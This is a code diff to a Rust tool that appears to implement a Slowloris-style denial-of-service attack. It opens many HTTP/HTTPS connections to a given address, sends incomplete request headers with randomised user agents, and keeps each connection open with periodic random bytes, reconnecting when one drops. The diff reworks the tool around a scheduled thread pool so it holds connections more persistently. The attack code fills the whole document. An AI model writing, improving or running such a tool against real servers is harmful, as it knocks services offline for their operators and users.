@@ -3,9 +3,11 @@ Copyright (c) 2021 trivernis
 See LICENSE for more information
  */
 use native_tls::TlsConnector;
-use rayon::prelude::*;
+use rand::Rng;
+use scheduled_thread_pool::ScheduledThreadPool;
 use std::io::Write;
 use std::net::TcpStream;
+use std::sync::Arc;
 use std::thread;
 use std::time::Duration;
 use structopt::StructOpt;
@@ -32,49 +34,49 @@ struct Opt {
 
 fn main() {
     let opts: Opt = Opt::from_args();
-    let mut connections = create_connections(&*opts.address, opts.port, opts.count, !opts.http);
-    println!("Created {} connections", connections.len());
+    let pool = Arc::new(scheduled_thread_pool::ScheduledThreadPool::new(
+        num_cpus::get(),
+    ));
 
-    loop {
-        thread::sleep(Duration::from_secs(10));
-        println!(r#"Sending "Keep-Alive" Headers"#);
-        let mut new_connections = Vec::new();
+    for i in 0..opts.count {
+        let address = opts.address.clone();
+        let port = opts.port;
+        let https = !opts.http;
 
-        for mut connection in connections {
-            if let Ok(_) = connection.write_all(&[rand::random::<u8>()]) {
-                new_connections.push(connection);
-            }
-        }
-        connections = new_connections;
+        keep_alive(Arc::clone(&pool), i, address, port, https);
+    }
+    thread::park();
+}
 
-        if connections.len() < opts.count {
-            let mut more_connections = create_connections(
-                &*opts.address,
-                opts.port,
-                opts.count - connections.len(),
-                !opts.http,
-            );
-            connections.append(&mut more_connections);
-        }
+/// Sends Keep-Alive data to the server
+fn keep_alive(pool: Arc<ScheduledThreadPool>, i: usize, address: String, port: u32, https: bool) {
+    let mut rng = rand::thread_rng();
 
-        println!("Connection count: {}", connections.len())
+    if let Some(mut stream) = create_connection(&*address, port, https) {
+        println!("Connection {} established.", i);
+        let pool_clone = Arc::clone(&pool);
+
+        pool.execute_at_fixed_rate(
+            Duration::from_secs(rng.gen_range(5..10)),
+            Duration::from_secs(rng.gen_range(5..10)),
+            move || {
+                println!(r#"Sending "Keep-Alive-Header" for connection {}..."#, i);
+
+                if let Err(_) = stream.write_all(&[rand::random::<u8>()]) {
+                    let address = address.clone();
+                    let pool_clone2 = Arc::clone(&pool_clone);
+                    println!("Connection {} lost. Reestablishing...", i);
+
+                    pool_clone.execute(move || {
+                        keep_alive(pool_clone2, i, address, port, https);
+                    });
+                }
+            },
+        );
     }
 }
 
-/// Creates connections
-fn create_connections(
-    address: &str,
-    port: u32,
-    count: usize,
-    https: bool,
-) -> Vec<Box<dyn Write + Send + Sync>> {
-    return (0..count)
-        .par_bridge()
-        .filter_map(|_| create_connection(address, port, https))
-        .collect();
-}
-
-/// Creates a single connection yo
+/// Creates a single HTTP/S connection
 fn create_connection(
     address: &str,
     port: u32,
@@ -88,18 +90,22 @@ fn create_connection(
         .ok()?;
 
     let mut stream: Box<dyn Write + Send + Sync> = if https {
-        let connector = TlsConnector::new().unwrap();
-        let tls_stream = connector.connect(&*address.clone(), tcp_stream).unwrap();
+        let connector = TlsConnector::new().ok()?;
+        let tls_stream = connector.connect(&*address.clone(), tcp_stream).ok()?;
         Box::new(tls_stream)
     } else {
         Box::new(tcp_stream)
     };
 
-    stream.write_all(b"GET / HTTP/1.1\r\n").ok()?;
     stream
-        .write_all(format!("User-Agent: {}\r\n", fakeit::user_agent::random_platform()).as_bytes())
+        .write_all(
+            format!(
+                "GET / HTTP/1.0\r\nUser-Agent: {}\r\nX-a: ",
+                fakeit::user_agent::random_platform()
+            )
+            .as_bytes(),
+        )
         .ok()?;
-    stream.write_all(b"X-a: {}\r\n").ok()?;
 
     Some(stream)
 }
